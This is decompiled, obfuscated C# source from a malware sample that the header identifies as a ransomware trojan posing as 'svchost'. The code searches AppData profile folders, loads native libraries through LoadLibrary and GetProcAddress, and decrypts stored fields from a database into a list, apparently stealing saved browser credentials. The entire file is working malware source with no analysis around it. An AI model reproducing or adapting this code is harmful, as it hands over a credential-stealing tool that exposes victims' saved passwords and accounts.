// Decompiled with JetBrains decompiler
// Type:  
// Assembly: svchost, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 422D1FBC-502B-4DB7-AC18-B994031CE62D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\HEUR-Trojan-Ransom.Win32.Generic-7709a3ed96ddad83c1364a32bd84290b3d00212a09fc6619f0588d3725c06799.exe

using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

internal sealed class \u0002\u2000
{
  private static IntPtr \u0002;

  public static void \u0002()
  {
    string str1 = string.Empty;
    string str2 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + \u0008\u2003.\u0002(415306676);
    foreach (string directory in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0008\u2003.\u0002(415306652)))
    {
      foreach (string file in Directory.GetFiles(directory, \u0008\u2003.\u0002(415306620)))
      {
        if (file.Contains(\u0008\u2003.\u0002(415306571)))
        {
          str1 = file;
          \u0002\u2000.\u0002(directory, str2);
        }
      }
    }
    \u0003\u2003 obj = new \u0003\u2003(str1);
    obj.\u0002(\u0008\u2003.\u0002(415306576));
    for (int index = 0; index <= obj.\u0002() - 1; ++index)
    {
      string str3 = obj.\u0002(index, \u0008\u2003.\u0002(415306529));
      string str4 = obj.\u0002(index, \u0008\u2003.\u0002(415306544));
      string str5 = \u0002\u2000.\u0002(obj.\u0002(index, \u0008\u2003.\u0002(415306500)));
      string str6 = \u0002\u2000.\u0002(obj.\u0002(index, \u0008\u2003.\u0002(415306988)));
      \u000E\u2000.\u0002.Add(new \u0005\u2000(\u0008\u2003.\u0002(415306996), str3, str5, str6, str4));
    }
  }

  public static string \u0002(string _param0)
  {
    StringBuilder stringBuilder = new StringBuilder(_param0);
    \u0002\u2000.\u000F obj = new \u0002\u2000.\u000F();
    \u0002\u2000.\u0002(\u0002\u2000.\u0002(), true, 0L);
    \u0002\u2000.\u000F structure = (\u0002\u2000.\u000F) Marshal.PtrToStructure(new IntPtr(\u0002\u2000.\u0002(IntPtr.Zero, IntPtr.Zero, stringBuilder, stringBuilder.Length)), typeof (\u0002\u2000.\u000F));
    if (\u0002\u2000.\u0002(ref structure, ref obj, 0) != 0 || obj.\u0005 == 0)
      return \u0008\u2003.\u0002(415306946);
    byte[] numArray = new byte[obj.\u0005];
    Marshal.Copy(new IntPtr(obj.\u0003), numArray, 0, obj.\u0005);
    return Encoding.ASCII.GetString(numArray);
  }

  public static long \u0002(string _param0, string _param1)
  {
    \u0002\u2000.\u0002(_param1 + \u0008\u2003.\u0002(415306974));
    \u0002\u2000.\u0002(_param1 + \u0008\u2003.\u0002(415306912));
    \u0002\u2000.\u0002(_param1 + \u0008\u2003.\u0002(415306928));
    \u0002\u2000.\u0002(_param1 + \u0008\u2003.\u0002(415306895));
    \u0002\u2000.\u0002(_param1 + \u0008\u2003.\u0002(415306911));
    \u0002\u2000.\u0002 = \u0002\u2000.\u0002(_param1 + \u0008\u2003.\u0002(415306850));
    return ((\u0002\u2000.\u0002) Marshal.GetDelegateForFunctionPointer(\u0002\u2000.\u0002(\u0002\u2000.\u0002, \u0008\u2003.\u0002(415306865)), typeof (\u0002\u2000.\u0002)))(_param0);
  }

  public static long \u0002() => ((\u0002\u2000.\u0003) Marshal.GetDelegateForFunctionPointer(\u0002\u2000.\u0002(\u0002\u2000.\u0002, \u0008\u2003.\u0002(415306816)), typeof (\u0002\u2000.\u0003)))();

  public static long \u0002(long _param0, bool _param1, long _param2) => ((\u0002\u2000.\u0005) Marshal.GetDelegateForFunctionPointer(\u0002\u2000.\u0002(\u0002\u2000.\u0002, \u0008\u2003.\u0002(415306798)), typeof (\u0002\u2000.\u0005)))(_param0, _param1, _param2);

  public static int \u0002(IntPtr _param0, IntPtr _param1, StringBuilder _param2, int _param3) => ((\u0002\u2000.\u0008) Marshal.GetDelegateForFunctionPointer(\u0002\u2000.\u0002(\u0002\u2000.\u0002, \u0008\u2003.\u0002(415306806)), typeof (\u0002\u2000.\u0008)))(_param0, _param1, _param2, _param3);

  public static int \u0002(
    ref \u0002\u2000.\u000F _param0,
    ref \u0002\u2000.\u000F _param1,
    int _param2)
  {
    return ((\u0002\u2000.\u0006) Marshal.GetDelegateForFunctionPointer(\u0002\u2000.\u0002(\u0002\u2000.\u0002, \u0008\u2003.\u0002(415306771)), typeof (\u0002\u2000.\u0006)))(ref _param0, ref _param1, _param2);
  }

  [DllImport("kernel32.dll", EntryPoint = "LoadLibrary")]
  private static extern IntPtr \u0002(string _param0);

  [DllImport("kernel32", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern IntPtr \u0002(IntPtr _param0, string _param1);

  [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
  public delegate long \u0002(string _param1);

  [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
  public delegate long \u0003();

  [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
  public delegate long \u0005(long _param1, bool _param2, long _param3);

  [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
  public delegate int \u0006(
    ref \u0002\u2000.\u000F _param1,
    ref \u0002\u2000.\u000F _param2,
    int _param3);

  [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
  public delegate int \u0008(IntPtr _param1, IntPtr _param2, StringBuilder _param3, int _param4);

  public sealed class \u000E
  {
    public static long \u0002;
    public static byte[] \u0003;
  }

  public struct \u000F
  {
    public int \u0002;
    public int \u0003;
    public int \u0005;
  }
}
